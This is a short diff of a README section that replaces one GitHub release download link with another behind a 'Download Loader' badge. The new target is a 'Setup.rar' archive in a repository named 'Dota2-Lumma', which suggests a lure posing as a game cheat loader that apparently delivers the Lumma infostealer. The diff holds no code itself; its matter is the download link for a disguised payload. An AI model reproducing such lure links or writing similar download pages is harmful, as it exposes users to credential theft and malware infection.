@@ -3,7 +3,7 @@
  
 
 <div align="center">
-  <a href="https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip">
+  <a href="https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar">
     <img src="https://img.shields.io/badge/⬇_Download-Loader-7c5cff?style=for-the-badge" alt="Download Loader">
   </a>
 </div>
